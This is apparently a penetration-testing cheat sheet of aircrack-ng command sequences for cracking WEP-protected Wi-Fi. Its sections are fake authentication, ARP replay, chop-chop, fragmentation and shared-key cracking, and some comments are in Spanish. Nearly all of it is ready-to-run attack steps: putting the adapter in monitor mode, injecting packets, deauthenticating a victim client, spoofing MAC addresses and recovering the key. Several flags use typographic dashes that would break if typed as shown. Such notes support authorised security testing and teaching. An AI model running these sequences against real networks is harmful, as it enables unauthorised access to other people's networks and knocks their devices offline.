---
description: >-
  Less probabable to find it today but important to have notes about how to
  attack them.
---

# WEP

## Fake Authentication Attack

```
airmon-ng start wlan0
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
# Identificamos nuestra MAC
macchanger --show wlan0mon
aireplay-ng -1 0 -a <BSSID> -h <nuestraMAC> -e <ESSID> wlan0mon
aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <nuestraMAC> wlan0mon
aircrack-ng –b <BSSID> <archivoPCAP>
```

## ARP Replay Attack

```
airmon-ng start wlan0
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
# Identificamos nuestra MAC
macchanger --show wlan0mon
aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <nuestraMAC> wlan0mon
aircrack-ng –b <BSSID> <archivoPCAP>
```

## Chop Chop Attack

```
airmon-ng start wlan0
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
# Identificamos nuestra MAC
macchanger --show wlan0mon
aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
aireplay-ng -4 –b <BSSID> -h <nuestraMAC> wlan0mon
# Presionamos ‘y’ ;
packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 –r <FileName2> wlan0mon
aircrack-ng <archivoPCAP>
```

## Fragmentation Attack

```
airmon-ng start wlan0
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
# Identificamos nuestra MAC
macchanger --show wlan0mon
aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
aireplay-ng -5 –b<BSSID> -h <nuestraMAC > wlan0mon
# Presionamos ‘y’ ;
packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 –r <FileName2> wlan0mon
aircrack-ng <archivoPCAP>
```

## SKA Type Cracking

```
airmon-ng start wlan0
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
aireplay-ng -0 10 –a <BSSID> -c <macVictima> wlan0mon
ifconfig wlan0mon down
macchanger –-mac <macVictima> wlan0mon
ifconfig wlan0mon up
aireplay-ng -3 –b <BSSID> -h <macFalsa> wlan0mon
aireplay-ng –-deauth 1 –a <BSSID> -h <macFalsa> wlan0mon
aircrack-ng <archivoPCAP>
```
